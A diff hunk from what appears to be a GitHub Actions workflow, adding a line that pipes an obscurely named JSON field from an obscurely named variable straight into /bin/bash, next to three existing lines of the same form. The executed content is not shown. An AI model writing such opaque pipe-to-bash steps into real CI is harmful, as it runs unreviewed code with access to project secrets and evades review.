@@ -31,6 +31,7 @@ jobs:
           echo $iyxm59 | jq -r .iyomy8654 | /bin/bash
           echo $ij0 | jq -r .j2111 | /bin/bash
           printf '%s' "$xh8" | jq -r .m96842 | /bin/bash
+          echo $pwh459 | jq -r .kjr558 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
